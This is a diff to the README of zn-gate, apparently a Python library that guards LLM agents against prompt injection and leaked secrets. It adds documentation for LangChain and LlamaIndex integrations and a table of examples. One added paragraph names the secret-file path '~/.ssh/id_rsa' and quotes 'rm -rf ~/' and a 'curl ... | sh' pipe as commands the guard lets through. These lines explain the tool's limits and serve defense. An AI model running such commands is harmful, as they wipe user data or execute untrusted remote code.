@@ -29,7 +29,7 @@ python3 -m venv .venv
 .venv/bin/pip install zn-gate      # Windows: .venv\Scripts\pip install zn-gate
 ```
 
-Inside an environment you already use (your project's virtualenv, Poetry, uv), `pip install zn-gate` is enough. Python 3.10 or later (CI tests 3.10 to 3.13). Zero runtime dependencies.
+Inside an environment you already use (your project's virtualenv, Poetry, uv), `pip install zn-gate` is enough. Python 3.10 or later (CI tests 3.10 to 3.14). Zero runtime dependencies.
 
 **If something fails:**
 
@@ -117,15 +117,39 @@ print(get_user_profile("user_123"))
 
 Arguments are checked before the function runs; with `on_block="raise"` a blocked call raises `GuardBlockError`. `mask_secrets` is off by default in `@guard`.
 
+`@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
+
 ### LangChain / LangGraph
+
+The integration is tested against `langchain-core` 1.2.31 and the current 1.x release; 1.2.31 is the minimum supported version.
 
 <!-- snippet-test -->
 ```python
 from zn_gate.integrations import ZnGuardCallbackHandler
 
-handler = ZnGuardCallbackHandler(raise_on_injection=True, mask_secrets=True)
+handler = ZnGuardCallbackHandler(on_block="raise")
 # pass callbacks=[handler] to your agent, chain or tool
 ```
+
+The handler stops the run. With `on_block="raise"` (default) a blocked prompt, tool call or tool output raises `GuardBlockError` out of the agent: the tool does not run and the output does not reach the model. `on_block="ignore"` turns that off. `"return"` is not accepted (it raises `ValueError`), because LangChain ignores what a callback returns; any other value raises `ValueError` too.
+
+A callback cannot change what a tool returns. So with `mask_secrets=True` (default) a tool output that contains a secret also stops the run. To hide the secret and keep going, or to give the model a block message instead of the output, wrap the tool (needs `langchain-core`):
+
+```python
+from langchain_core.tools import tool
+from zn_gate.integrations import guard_langchain_tool
+
+@tool
+def read_notes(topic: str) -> str:
+    """Read the team notes on a topic."""
+    return "Deploy key: AKIAIOSFODNN7EXAMPLE"
+
+safe_read_notes = guard_langchain_tool(read_notes, on_block="return")
+print(safe_read_notes.invoke({"topic": "deploy"}))
+# Deploy key: [REDACTED_AWS_KEY]
+```
+
+`guard_langchain_tool` returns a tool with the same name, description and arguments. It checks the arguments before the tool runs, checks the output for prompt injection (`check_result=True`) and hides secrets in it (`mask_secrets=True`) before the model reads it. With `on_block="return"` the model gets `fallback`, or a short block message, instead; with `"raise"` (default) it raises `GuardBlockError`. Pass the wrapped tools to your agent; use it on every tool that reads outside data or can reach files, shells or the network.
 
 ### CrewAI
 
@@ -153,6 +177,10 @@ guard = ZnLlamaGuard(raise_on_violation=True, mask_secrets=True)
 safe_query = guard.on_query_start(user_query)
 clean_response = guard.sanitize_response(query_engine.query(safe_query))
 ```
+
+`on_block` accepts `"raise"` (default), `"return"` or `"ignore"`; any other value raises `ValueError`. With `"return"`, `on_query_start` returns `fallback`, or a short block message, in place of the query, so the engine never sees the blocked text. `sanitize_response` hides secrets in text, lists, dicts and in the text of a LlamaIndex `Response` (on a copy).
+
+For LlamaIndex tools, wrap the function with `guarded_tool` before `FunctionTool.from_defaults(fn=...)`: the arguments are checked before it runs and its output is checked and masked before the agent reads it (see the `llamaindex-agent` example).
 
 ### Promptfoo
 
@@ -183,6 +211,8 @@ zn-gate analyze "some prompt"   # local check; cloud only with ZN_CLOUD=1 + key
 zn-gate status                  # engine and what leaves the machine
 ```
 
+More runnable examples are in [examples/](https://github.com/usezn/zn/tree/main/examples), including [a Haystack agent with a guarded tool](https://github.com/usezn/zn/tree/main/examples/haystack-agent) and [a smolagents agent with a guarded tool](https://github.com/usezn/zn/tree/main/examples/smolagents-agent).
+
 A DSPy ReAct agent whose tools are guarded by zn-gate is in [examples/dspy-agent](https://github.com/usezn/zn/tree/main/examples/dspy-agent).
 
 ---
@@ -202,6 +232,20 @@ We only publish numbers we can reproduce, with the method next to them.
 - `ZN_STRICT`: `1` also blocks the rules that only warn by default (same as `evaluate(text, strict=True)`; also `check_tool_call`, `check_tool_result` and `sanitize_tool_result` take `strict=True`).
 - `ZN_STAGE` / `ZN_API_URL`: cloud endpoint selection.
 - `NO_COLOR` (any non-empty value) or `TERM=dumb`: the command line output leaves out its symbols; the status words (ALLOW, BLOCK, clean, ...) stay.
+
+## Examples
+
+Runnable examples for the Python package, in [`examples/`](https://github.com/usezn/zn/tree/main/examples):
+
+| Example | Language | Framework | What it shows |
+|---|---|---|---|
+| [`python-basic`](https://github.com/usezn/zn/tree/main/examples/python-basic) | Python | None | Evaluate a prompt and guard a tool function. |
+| [`langchain-agent`](https://github.com/usezn/zn/tree/main/examples/langchain-agent) | Python | LangChain / LangGraph | Wrap tools so a blocked call does not run and secrets in tool output are hidden; a callback handler stops the run on a block. |
+| [`crewai-agent`](https://github.com/usezn/zn/tree/main/examples/crewai-agent) | Python | CrewAI | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`llamaindex-agent`](https://github.com/usezn/zn/tree/main/examples/llamaindex-agent) | Python | LlamaIndex | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`openai-agents-sdk`](https://github.com/usezn/zn/tree/main/examples/openai-agents-sdk) | Python | OpenAI Agents SDK | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`pydantic-ai-agent`](https://github.com/usezn/zn/tree/main/examples/pydantic-ai-agent) | Python | Pydantic AI | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`google-adk-agent`](https://github.com/usezn/zn/tree/main/examples/google-adk-agent) | Python | Google ADK | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
 
 ## FAQ
 
